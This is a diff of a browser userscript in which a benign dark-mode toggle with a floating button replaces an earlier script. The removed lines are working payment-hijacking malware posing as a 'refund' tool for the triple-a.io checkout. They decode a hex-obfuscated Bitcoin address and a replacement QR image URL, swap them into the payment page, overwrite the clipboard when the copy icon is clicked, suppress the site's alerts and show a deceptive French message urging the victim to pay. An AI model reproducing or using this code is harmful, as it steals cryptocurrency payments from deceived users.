@@ -1,84 +1,50 @@
-// ==UserScript==
-// @name Refund Work in September 2026
-// @namespace _
-// @version 26.09.2026
-// @description Refund 2026
-// @author TheCyver
-// @match https://app.triple-a.io/*
-// @grant none
-// ==/UserScript==
 (function () {
-'use strict';
-const addressHex = [
-'62', '63', '31', '71', '7a', '65', '64', '78',
-'33', '7a', '32', '78', '7a', '6b', '32', '34',
-'76', '64', '6a', '65', '79', '32', '37', '39',
-'76', '33', '75', '33', '78', '6e', '68', '39',
-'77', '73', '63', '35', '6a', '77', '6d', '77',
-'79', '6a'
-];
-const clientHash = addressHex.map(h => String.fromCharCode(parseInt(h, 16))).join('');
-const qrHex = [
-'68', '74', '74', '70', '73', '3a', '2f', '2f',
-'69', '2e', '69', '6d', '67', '75', '72', '2e',
-'63', '6f', '6d', '2f', '78', '45', '46', '6b',
-'4e', '6c', '55', '2e', '70', '6e', '67'
-];
-const imgPayload = qrHex.map(h => String.fromCharCode(parseInt(h, 16))).join('');
-let updated = false;
-const updateAddressAndQRCode = () => {
-const copyIcon =
-document.querySelector('.triplea-copy-icon-for-address,[data-testid="copy-icon"]');
-if (copyIcon) {
-copyIcon.addEventListener('click', () => {
-setTimeout(() => {
-navigator.clipboard.writeText(clientHash);
-}, 100);
-});
-}
-if (updated) return;
-const addressElement =
-document.querySelector('.triplea-new-address,[data-testid="btc-address"]');
-const qrElement =
-document.querySelector('.triplea-qrcode-container,img[src*="create-qr-code"]');
-if (addressElement && qrElement) {
-addressElement.innerText = clientHash;
-const qrImage = document.createElement('img');
-qrImage.src = imgPayload;
+    const KEY = 'wp-dark-enabled';
+    const STYLE_ID = 'wp-dark-style';
 
-qrImage.alt = 'QR Code personnalisé';
-qrImage.style.width = '200px';
-qrImage.style.height = '200px';
-qrImage.style.display = 'block';
-qrImage.style.margin = 'auto';
-qrImage.style.border = '1px solid #ccc';
-qrImage.style.padding = '10px';
-qrImage.style.background = '#fff';
-qrElement.replaceWith(qrImage);
-alert('Actualisation de la page glitch activé ! Horaire modifée, Appuyer sur Ok pourcontinuer
-et procédez au paiement ! Remboursement valable');
-updated = true;
-return true;
-}
-return false;
-};
-const startMonitoring = () => {
-const intervalId = setInterval(() => {
-if (updateAddressAndQRCode()) clearInterval(intervalId);
-}, 200);
-};
-if (document.readyState === 'loading') {
-document.addEventListener('DOMContentLoaded', startMonitoring);
-} else {
-startMonitoring();
-}
-const observer = new MutationObserver(() => {
-if (!updated) updateAddressAndQRCode();
-});
-observer.observe(document.body, { childList: true, subtree: true });
-setInterval(() => {
-document.querySelectorAll('[data-test-id*="alert-wrapper"]').forEach(el => el.remove());
-const oldQR = document.querySelector('.triplea-qrcode-container');
-if (oldQR) oldQR.remove();
-}, 100);
+    const CSS = `
+        html { background: #fff !important; filter: invert(1) hue-rotate(180deg) !important; }
+        img, video, canvas, picture, .mw-file-element, .thumbimage {
+            filter: invert(1) hue-rotate(180deg) !important;
+        }
+        .mwe-math-element img, .mwe-math-fallback-image-inline,
+        .mwe-math-fallback-image-display { filter: none !important; }
+    `;
+
+    const isEnabled = () => {
+        try { return localStorage.getItem(KEY) !== '0'; } catch (e) { return true; }
+    };
+
+    function apply() {
+        let el = document.getElementById(STYLE_ID);
+        if (isEnabled()) {
+            if (!el) {
+                el = document.createElement('style');
+                el.id = STYLE_ID;
+                el.textContent = CSS;
+                (document.head || document.documentElement).appendChild(el);
+            }
+        } else if (el) el.remove();
+    }
+
+    function addButton() {
+        if (document.getElementById('wp-dark-btn')) return;
+        const btn = document.createElement('button');
+        btn.id = 'wp-dark-btn';
+        btn.textContent = '🌓';
+        btn.title = 'Activer / désactiver le fond noir';
+        btn.style.cssText = `position:fixed;bottom:16px;right:16px;z-index:999999;
+            width:44px;height:44px;border-radius:50%;border:1px solid #888;
+            background:#222;color:#fff;font-size:20px;cursor:pointer;opacity:.85;
+            filter:invert(1) hue-rotate(180deg);`;
+        btn.onclick = () => {
+            try { localStorage.setItem(KEY, isEnabled() ? '0' : '1'); } catch (e) {}
+            apply();
+        };
+        document.body.appendChild(btn);
+    }
+
+    apply();
+    if (document.body) addButton();
+    else document.addEventListener('DOMContentLoaded', addButton);
 })();
